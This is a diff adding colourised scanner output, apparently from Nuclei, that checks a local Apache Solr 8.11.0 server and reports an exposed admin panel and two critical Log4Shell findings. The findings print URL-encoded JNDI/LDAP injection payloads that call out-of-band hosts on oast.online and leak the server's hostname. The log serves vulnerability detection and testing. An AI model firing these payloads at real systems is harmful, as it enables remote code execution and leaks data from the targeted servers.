@@ -1,0 +1,4 @@
+[[93mWRN[0m] Loading 12 unsigned templates for scan. Use with caution.
+[[92msolr-panel-exposure[0m] [[94mhttp[0m] [[34minfo[0m] http://127.0.0.1:8983/solr/ [[96m"8.11.0"[0m]
+[[92mapache-solr-log4j-rce[0m] [[94mhttp[0m] [[31mcritical[0m] http://127.0.0.1:8983/solr/admin/cores?action=%24%7Bjndi%3Aldap%3A%2F%2F%24%7B%3A-507%7D%24%7B%3A-272%7D.%24%7BhostName%7D.uri.d8eppnmri3pl355dlg10a7wf6dq75yk38.oast.online%2F%7D [[96m"210.94.72.14"[0m,[96m"uri"[0m,[96m"65cb43785aac"[0m] [[93mendpoint[0m=[93m"cores"[0m]
+[[92mapache-solr-log4j-rce[0m] [[94mhttp[0m] [[31mcritical[0m] http://127.0.0.1:8983/solr/admin/collections?action=%24%7Bjndi%3Aldap%3A%2F%2F%24%7B%3A-507%7D%24%7B%3A-272%7D.%24%7BhostName%7D.uri.d8eppnmri3pl355dlg10trfnxu3i37zus.oast.online%2F%7D [[96m"210.94.11.97"[0m,[96m"uri"[0m,[96m"65cb43785aac"[0m] [[93mendpoint[0m=[93m"collections"[0m]
